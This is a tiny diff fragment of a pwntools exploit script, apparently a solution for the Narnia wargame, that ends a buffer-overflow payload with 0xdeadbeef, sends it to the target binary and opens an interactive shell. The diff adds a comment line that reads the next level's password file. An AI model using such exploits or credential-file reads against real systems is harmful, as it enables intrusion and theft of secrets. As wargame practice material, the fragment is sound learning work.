@@ -22,3 +22,5 @@ payload += p32(0xdeadbeef)
 p = process(binary)
 p.sendline(payload)
 p.interactive()
+
+#cat /etc/narnia_pass/narnia1
